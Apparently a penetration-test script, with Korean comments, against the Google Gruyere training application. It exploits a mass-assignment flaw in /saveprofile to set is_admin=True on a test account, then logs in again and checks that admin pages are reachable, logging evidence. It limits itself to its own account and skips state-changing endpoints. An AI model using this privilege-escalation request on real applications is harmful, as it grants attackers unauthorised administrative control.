#!/usr/bin/env python3
"""Round 3 — 매스어사인먼트/클라이언트 상태 조작을 통한 권한 상승 (Elevation of Privilege).

_saveprofile 은 uid/is_admin/is_author 를 요청 파라미터에서 그대로 프로필에 기록한다.
따라서 일반 사용자가 자기 프로필 update 한 번으로 is_admin=True 를 심을 수 있다.
(쿠키 플래그는 로그인 시점에 프로필에서 샘플링되므로 재로그인해야 반영된다.)

범위: 테스트 계정 brie (test_account.json). 다른 계정(cheddar/sardo/administrator)의
프로필은 변경하지 않는다 — 상태변경이므로 승인 게이트 대상.
"""
from __future__ import annotations

import re
import subprocess
from pathlib import Path

ROOT = Path(__file__).resolve().parent.parent
SCRATCH = ROOT / "scratch"
EVIDENCE = ROOT / "evidence"
EVIDENCE.mkdir(exist_ok=True)
GID = (SCRATCH / "gid.txt").read_text().strip().split("=", 1)[1]
BASE = f"https://google-gruyere.appspot.com/{GID}"
JAR = SCRATCH / "gruyere.cookies"
CA = "/home/taeuk/.mitmproxy/mitmproxy-ca-cert.pem"


def curl(path: str, jar: Path = JAR, extra: list[str] | None = None) -> tuple[str, str]:
    cmd = ["curl", "-s", "-D", "-", "--path-as-is", "--max-time", "30",
           "-x", "http://127.0.0.1:8080", "--cacert", CA,
           "-b", str(jar), "-c", str(jar)]
    cmd += (extra or [])
    cmd.append(BASE + path)
    out = subprocess.run(cmd, capture_output=True, text=True).stdout
    return out, out.split("\r\n\r\n", 1)[-1]


def cookie_field(html: str) -> str:
    m = re.search(r"_cookie:&nbsp;</td>\s*<td valign='top'><pre>(.*?)</pre>", html, re.S)
    return m.group(1).strip() if m else "?"


def profile_field(html: str) -> str:
    m = re.search(r"_profile:&nbsp;</td>\s*<td valign='top'><pre>(.*?)</pre>", html, re.S)
    return (m.group(1).strip() if m else "?")


def main() -> None:
    rep: list[str] = []
    rep.append(f"GID={GID}\nBASE={BASE}\n")

    # --- 0. 재로그인 (brie 세션 쿠키 확보) ---
    h, _ = curl(f"/login?uid=brie&pw=briebrie", jar=JAR)
    setc = [l for l in h.splitlines() if l.lower().startswith("set-cookie")]
    rep.append("### 0) brie 로그인")
    rep.append(f"  {setc}")

    # --- 1. 사전 상태 (is_admin False 여야 함) ---
    _, dump = curl("/dump.gtl")
    rep.append("\n### 1) 변경 전 상태 (대조군)")
    rep.append(f"  /dump.gtl _cookie : {cookie_field(dump)}")
    rep.append(f"  /dump.gtl _profile: {profile_field(dump)[:200]}")
    before = cookie_field(dump)

    # --- 2. 매스어사인먼트: uid+is_admin 을 파라미터로 밀어넣기 ---
    rep.append("\n### 2) 매스어사인먼트 실행 (내 계정만)")
    payload = "/saveprofile?action=update&uid=brie&is_admin=True&name=Brie"
    h, body = curl(payload)
    loc = [l for l in h.splitlines() if l.lower().startswith("location")]
    rep.append(f"  GET {payload}")
    rep.append(f"  → status/headers: {[l for l in h.splitlines() if l.startswith('HTTP/')]} {loc}")
    (EVIDENCE / "round3_massassign_response.html").write_text(h + "\n" + body, encoding="utf-8", errors="replace")

    # --- 3. 변경 후 프로필 확인 (세션 쿠키는 아직 옛 플래그) ---
    _, dump2 = curl("/dump.gtl")
    rep.append("\n### 3) 변경 후 (같은 세션 — 쿠키는 로그인 시 샘플링이라 아직 일반권한)")
    rep.append(f"  _cookie : {cookie_field(dump2)}")
    prof2 = profile_field(dump2)
    rep.append(f"  _profile: {prof2[:260]}")

    # --- 4. 재로그인 → 새 쿠키가 admin 플래그를 갖는지 ---
    h3, _ = curl(f"/login?uid=brie&pw=briebrie")
    setc3 = [l for l in h3.splitlines() if l.lower().startswith("set-cookie")]
    rep.append("\n### 4) 재로그인 → 쿠키 재발급")
    rep.append(f"  {setc3}")

    _, dump3 = curl("/dump.gtl")
    rep.append(f"  _cookie : {cookie_field(dump3)}")

    # --- 5. 관리자 전용 UI 도달 확인 ---
    _, manage = curl("/manage.gtl")
    _, newacc = curl("/newaccount.gtl")
    # /reset 은 상태변경(DB 초기화)이므로 호출하지 않고 차단/통과 게이트만 서술한다.
    rep.append("\n### 5) 관리자 권한 도달 확인 (읽기 전용)")
    rep.append(f"  /manage.gtl 'Manage this server' 노출: {'Manage this server' in manage}")
    admin_radio_marker = "name='is_admin'"
    rep.append(f"  /newaccount.gtl 관리자 전용 is_admin 라디오: {admin_radio_marker in newacc}")

    ok = ("is_admin': True" in cookie_field(dump3).replace('"', "'")) and ("Manage this server" in manage)
    rep.append(f"\n>>> 매스어사인먼트 EoP 성공 여부: {ok}")
    rep.append(f">>> 대조군(변경 전 쿠키): {before}")

    out = "\n".join(rep)
    (EVIDENCE / "round3_massassign_eop.txt").write_text(out, encoding="utf-8")
    print(out)


if __name__ == "__main__":
    main()
